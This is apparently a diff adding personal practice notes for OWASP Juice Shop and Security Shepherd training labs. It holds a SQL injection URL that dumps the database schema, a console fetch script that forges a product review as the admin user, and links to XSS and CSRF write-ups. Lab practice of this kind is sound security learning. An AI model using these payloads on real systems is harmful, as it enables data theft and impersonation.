@@ -1,3 +1,33 @@
+
+
+juice-- databaseschema
+http://192.168.20.47:45868/rest/products/search?q=apple%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--
+
+reference 
+https://docs.google.com/document/d/e/2PACX-1vR6ibdy-ZwdkISH7dASKHh6sC6IwYJJdhM0zEAmn4HATstgoPeN6XDLisP5HZ9WL0H-mGU_C5F_6jVc/pub
+
+juice--view basket
+fetch('http://localhost:3000/rest/products/1/reviews', {
+  method: 'PUT',
+  headers: {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer ' + localStorage.getItem('token')
+  },
+  body: JSON.stringify({
+    message: "This product is amazing! (Forged via Console)",
+    author: "admin@juice-sh.op" 
+  })
+})
+.then(response => response.json())
+.then(data => console.log("Success:", data))
+.catch(error => console.error("Error:", error));
+
+xss-shepharid -- https://purpleskypeter.blogspot.com/2018/04/owasp-securityshepherd-xss6.html
+
+
+
+
+
 Security Sheperd
 CSRF total 9 types 
 
